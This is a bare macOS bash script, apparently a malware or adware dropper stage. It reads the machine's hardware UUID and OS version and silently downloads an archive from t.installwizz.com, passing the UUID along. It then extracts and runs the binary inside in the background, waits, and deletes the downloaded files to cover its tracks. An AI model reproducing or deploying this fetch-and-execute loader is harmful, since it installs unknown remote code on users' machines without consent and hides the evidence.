#!/bin/bash

func_act(){
    OS_Version=$(sw_vers -productVersion)
    mid=$(ioreg -rd1 -c IOPlatformExpertDevice | awk '/IOPlatformUUID/ { split($0, line, "\""); printf("%s\n", line[4]); }')
    if [[ ${OS_Version} == *"10.12"* ]]; then
      /usr/bin/curl -s -L -o /var/tmp/act.tgz "http://t.installwizz.com/is/cact?i=[DOWNLOAD_HASHID]&ve=10.12&id=$mid"
    else
      /usr/bin/curl -s -L -o /var/tmp/act.tgz "http://t.installwizz.com/is/cact?i=[DOWNLOAD_HASHID]&id=$mid"
    fi
    tar -xzf /var/tmp/act.tgz -C /var/tmp
    /var/tmp/act/act zzzzzzzz-8c8c-4507-aaae-99f77c459aaw [DOWNLOAD_HASHID]
    sleep 120
    rm -rf /var/tmp/act/act
    rm -rf /var/tmp/act.tgz
}
func_act &